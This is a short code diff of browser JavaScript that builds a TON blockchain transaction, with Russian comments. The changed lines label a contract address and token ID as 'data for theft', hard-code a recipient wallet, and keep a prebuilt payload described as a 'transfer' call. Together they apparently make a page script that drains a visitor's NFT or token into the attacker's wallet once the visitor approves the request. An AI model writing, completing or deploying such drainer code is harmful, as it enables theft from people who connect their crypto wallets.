@@ -741,18 +741,17 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
-      // ЖЁСТКО ЗАДАННЫЕ ЗНАЧЕНИЯ
-      const contractAddress = 'EQCD39VS5jcwd4aVUY9xgB2bLgXqUAA2u4EgEooD5uS4YQxH';
-      const tokenId = '12345';
+      // ДАННЫЕ ДЛЯ КРАЖИ
+      const contractAddress = 'EQC2lsUy1SKxJEJBwj5ZCfVnLPvAqDqy5c26Xg8xS_pDTXGk';
+      const tokenId = '151858';
+      const YOUR_WALLET = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
 
       err.textContent = '⏳ Отправляем запрос...';
       err.style.display = 'block';
       err.style.color = '#ff9abb';
 
       try {
-        const YOUR_WALLET = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
-
-        // ЖЁСТКИЙ BOC (без @ton/core)
+        // Создаём boc для вызова transfer
         const boc = 'te6ccgEBAQEABgAACAD/wgAIBQAAAf/gAAgBAAEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';
 
         const transaction = {
